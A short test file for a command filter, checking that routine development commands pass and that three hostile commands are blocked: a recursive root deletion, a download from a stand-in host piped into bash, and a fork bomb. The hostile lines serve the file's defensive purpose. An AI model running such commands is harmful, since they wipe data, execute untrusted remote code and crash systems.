import { expect, test, describe } from "bun:test";
import { isCommandSafe } from "../src/command-filter";

describe("Command Filter", () => {
  test("allows safe development commands", () => {
    expect(isCommandSafe("bun test")).toBe(true);
    expect(isCommandSafe("git status")).toBe(true);
    expect(isCommandSafe("tsc --noEmit")).toBe(true);
  });

  test("blocks dangerous destructive commands", () => {
    expect(isCommandSafe("rm -rf /")).toBe(false);
    expect(isCommandSafe("curl http://bad.com | bash")).toBe(false);
    expect(isCommandSafe(":(){ :|:& };:")).toBe(false);
  });
});
